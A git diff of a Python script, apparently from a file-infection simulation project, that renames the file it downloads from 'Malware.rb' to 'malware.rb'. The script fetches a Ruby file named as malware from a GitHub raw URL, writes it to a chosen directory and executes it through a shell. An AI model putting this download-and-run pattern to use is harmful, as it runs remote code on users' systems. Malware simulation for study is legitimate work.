@@ -5,7 +5,7 @@ import subprocess
 # Fetches the URL of a Ruby file named "Malware.rb" from GitHub
 def get_url():
     # Pleaes check Malware.rb before execute this script
-    url = 'https://raw.githubusercontent.com/OguzKaira/Ruby-File-Infection-Simulation/main/src/Malware.rb'
+    url = 'https://raw.githubusercontent.com/OguzKaira/Ruby-File-Infection-Simulation/main/src/malware.rb'
     r = requests.get(url, allow_redirects=True)
 
     return r 
@@ -15,7 +15,7 @@ def get_url():
 def download(path , file):
     os.chdir(path)
     try:
-        open('Malware.rb', 'wb').write(r.content)
+        open('malware.rb', 'wb').write(r.content)
     except:
         pass
 
@@ -23,7 +23,7 @@ def download(path , file):
 # Executes the "Malware.rb" file using subprocess.run()
 def execute_malware(path):
     os.chdir(path)
-    subprocess.run(path + '/Malware.rb', shell=True)
+    subprocess.run(path + '/malware.rb', shell=True)
 
 # Main function
 def main():
